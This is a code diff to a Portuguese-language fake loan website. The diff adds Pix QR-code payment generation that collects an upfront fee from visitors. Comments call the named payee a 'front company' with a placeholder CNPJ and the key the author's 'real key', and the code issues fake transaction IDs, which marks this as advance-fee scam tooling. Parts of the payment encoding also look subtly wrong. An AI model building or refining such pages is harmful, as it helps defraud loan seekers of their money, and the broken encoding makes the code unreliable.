@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
+<script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>    
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -511,6 +512,132 @@
         const COMPANY_NAME = "SecurePay Soluções Financeiras LTDA";
 // ATUALIZAÇÃO AUTOMÁTICA DA CHAVE NA TELA
 // Isso garante que o texto exibido seja sempre o valor da variável PIX_KEY
+// --- CONFIGURAÇÃO PIX ---
+// Estes dados devem ser os da sua "empresa de fachada"
+const PIX_RECEBEDOR_NOME = "SecurePay Soluções Financeiras LTDA"; // Nome que vai aparecer no app dela
+const PIX_RECEBEDOR_CNPJ = "00.000.000/0001-00"; // CNPJ da fachada (pode ser fictício se for chave CNPJ)
+const PIX_CHAVE = "0ed76d73-a78f-49c7-ae7f-02a63bff76c6"; // Sua chave real
+const PIX_CELULAR_REMETENTE = ""; // Deixar vazio
+
+// Função para formatar o valor no padrão Pix (sem ponto de milhar, vírgula para centavos)
+function formatarValorPix(valor) {
+    return valor.toFixed(2).replace('.', ',');
+}
+
+// Função para gerar o payload "Copia e Cola" (Padrão EMV)
+function gerarPixCopiaECola(valor) {
+    const merchantAccountInformation = {
+        "gui": "00", // Br
+        "key": "br.gov.bcb.pix",
+        "value": PIX_CHAVE
+    };
+
+    const merchantCategoryCode = "0000";
+    const merchantName = PIX_RECEBEDOR_NOME;
+    const merchantCity = "SAO PAULO"; // Cidade da sua fachada
+    const transactionAmount = formatarValorPix(valor);
+    const transactionCurrency = "986"; // BRL
+    const referenceId = ""; // Opcional
+    const additionalData = {
+        "gui": "05",
+        "key": "txid",
+        "value": ""
+    };
+
+    // Função auxiliar para calcular o CRC16
+    function calculaCRC16(payload) {
+        let crc = 0xFFFF;
+        for (let i = 0; i < payload.length; i++) {
+            crc ^= payload.charCodeAt(i) << 8;
+            for (let j = 0; j < 8; j++) {
+                if ((crc & 0x8000) > 0) {
+                    crc = (crc << 1) ^ 0x1021;
+                } else {
+                    crc <<= 1;
+                }
+            }
+        }
+        return crc.toString(16).toUpperCase().padStart(4, '0');
+    }
+
+    function montaCampo(id, valor) {
+        const tamanho = valor.length.toString().padStart(2, '0');
+        return id + tamanho + valor;
+    }
+
+    // Monta os campos fixos
+    let payload = "000201"; // Payload Format Indicator
+    payload += montaCampo("01", "12"); // Point of Initiation Method (QR Code)
+    payload += montaCampo("26", montaCampo("00", "br.gov.bcb") + montaCampo("01", PIX_CHAVE)); // Merchant Account Information
+    payload += montaCampo("52", "0000"); // Merchant Category Code
+    payload += montaCampo("53", "986"); // Transaction Currency
+    payload += montaCampo("54", transactionAmount); // Transaction Amount
+    payload += montaCampo("58", merchantName); // Merchant Name
+    payload += montaCampo("59", merchantCity); // Merchant City
+    payload += "6304"; // CRC16 Length
+    
+    // Calcula o CRC16
+    const crc = calculaCRC16(payload);
+    payload += crc;
+
+    return payload;
+}
+
+// Atualiza a tela de pagamento com o QR Code e o valor
+function atualizarTelaPagamento() {
+    // 1. Atualiza o nome do beneficiário
+    document.getElementById('beneficiario-qr').innerText = PIX_RECEBEDOR_NOME;
+    
+    // 2. Atualiza o valor em destaque
+    document.getElementById('pix-valor-display').innerText = formatCurrency(feeAmount);
+
+    // 3. Gera o QR Code
+    const pixPayload = gerarPixCopiaECola(feeAmount);
+    
+    // Armazena o payload para a função de copiar
+    window.currentPixPayload = pixPayload;
+
+    // Gera a imagem do QR Code
+    const container = document.getElementById('qrcode-container');
+    container.innerHTML = ''; // Limpa o "Gerando..."
+    
+    QRCode.toCanvas(container, pixPayload, { 
+        width: 200, 
+        height: 200,
+        color: { 
+            dark: "#000000", 
+            light: "#ffffff" 
+        } 
+    }, function (error) {
+        if (error) {
+            container.innerHTML = '<p style="color: red;">Erro ao gerar QR Code. Use o botão de copiar.</p>';
+            console.error(error);
+        }
+    });
+}
+
+// Função para copiar o "Copia e Cola"
+function generatePayment() {
+    if (loanAmount === 0) {
+        alert("Defina um valor de empréstimo válido (mínimo R$ 1.000,00).");
+        return;
+    }
+
+    // Gera um ID de transação fake
+    const txnId = "TXN-" + Math.random().toString(36).substring(2, 8).toUpperCase();
+    document.getElementById('payment-id').innerText = txnId;
+    
+    // Atualiza o valor total (para o QR Code ler)
+    document.getElementById('pay-final-amount').innerText = formatCurrency(feeAmount);
+
+    // Esconde config, mostra payment
+    document.getElementById('step-config').style.display = 'none';
+    document.getElementById('step-payment').classList.add('active');
+    
+    // NOVO: Atualiza a tela com o QR Code
+    atualizarTelaPagamento();
+}
+        
 document.getElementById('pix-key-display').innerText = PIX_KEY;
         // --- ESTADO DA APLICAÇÃO ---
         let loanAmount = 0;
